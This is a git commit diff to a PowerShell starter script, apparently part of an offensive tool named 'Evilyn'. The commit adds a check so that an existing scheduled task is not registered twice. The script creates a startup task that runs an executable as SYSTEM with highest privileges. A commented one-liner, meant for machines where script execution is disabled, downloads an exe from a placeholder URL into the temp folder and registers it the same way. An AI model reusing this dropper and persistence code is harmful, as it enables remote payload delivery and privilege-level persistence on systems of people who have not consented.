6e4cd5d1b57e285c08b0d95c5755982a1910886f
jakub.kolacek <jakub.kolacek@ibacz.eu>
2023-10-23 10:35:20 +0200

    Check if the task is already scheduled

--- powershell/starter.ps1
+++ powershell/starter.ps1
@@ -12,13 +12,16 @@ $taskAction = New-ScheduledTaskAction -Execute "$destinationPath"
 $taskTrigger = New-ScheduledTaskTrigger -AtStartup
 $taskName = "Evilyn"
 $systemUser = "NT AUTHORITY\SYSTEM"
-Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -TaskName $taskName -TaskPath "\" -User $systemUser -RunLevel Highest
 
-# Set the task to run with highest privileges
-Set-ScheduledTask -TaskName $taskName -TaskPath "\" -User $systemUser
-
-# Enable the scheduled task to make it run at startup
-Enable-ScheduledTask -TaskName $taskName -TaskPath "\"
+# Check if the task already exists
+try {
+    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
+    Write-Output "Task $taskName already exists."
+} catch {
+    # If the task does not exist, register it
+    Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -TaskName $taskName -TaskPath "\" -User $systemUser -RunLevel Highest
+    Enable-ScheduledTask -TaskName $taskName -TaskPath "\"
+}
 
 # Here is oneline-version of the script, for cases where script execution is disabled
-# $exeUrl = "PATH_TO_EXE"; $destinationPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "evilyn.exe"); Invoke-WebRequest -Uri $exeUrl -OutFile $destinationPath; $taskAction = New-ScheduledTaskAction -Execute "$destinationPath"; $taskTrigger = New-ScheduledTaskTrigger -AtStartup; $taskName = "Evilyn"; $systemUser = "NT AUTHORITY\SYSTEM"; Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -TaskName $taskName -TaskPath "\" -User $systemUser -RunLevel Highest; Enable-ScheduledTask -TaskName $taskName -TaskPath "\"
+# $exeUrl = "PATH_TO_EXE"; $destinationPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "evilyn.exe"); Invoke-WebRequest -Uri $exeUrl -OutFile $destinationPath; $taskAction = New-ScheduledTaskAction -Execute "$destinationPath"; $taskTrigger = New-ScheduledTaskTrigger -AtStartup; $taskName = "Evilyn"; $systemUser = "NT AUTHORITY\SYSTEM"; try { $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop; Write-Output "Task $taskName already exists." } catch { Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -TaskName $taskName -TaskPath "\" -User $systemUser -RunLevel Highest; Enable-ScheduledTask -TaskName $taskName -TaskPath "\" }
